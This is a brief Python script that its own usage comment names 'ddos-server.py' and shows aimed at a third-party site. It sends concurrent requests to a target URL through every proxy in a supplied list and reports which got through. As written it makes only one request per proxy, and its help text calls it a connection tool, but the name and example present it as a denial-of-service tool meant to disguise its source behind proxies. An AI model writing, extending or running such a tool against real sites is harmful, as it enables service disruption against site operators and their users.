import requests
import argparse
import concurrent.futures

# Run script like: python3 ddos-server.py https://weakbaby.org proxylist.txt

def check_proxy(proxy, destination):
    try:
        response = requests.get(destination, proxies={'http': proxy, 'https': proxy}, timeout=5)
        print(f"{proxy} connected successfully to {destination} with status code {response.status_code}")
    except:
        print(f"{proxy} failed to connect to {destination}")

def main(destination, proxy_list_path):
    with open(proxy_list_path) as f:
        proxy_list = f.read().splitlines()
    
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = []
        for proxy in proxy_list:
            futures.append(executor.submit(check_proxy, proxy, destination))
    
        for future in concurrent.futures.as_completed(futures):
            pass

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Connect to a destination through multiple proxies')
    parser.add_argument('destination', help='Destination to connect to')
    parser.add_argument('proxy_list_path', help='Path to the file containing the list of proxies')
    args = parser.parse_args()

    main(args.destination, args.proxy_list_path)
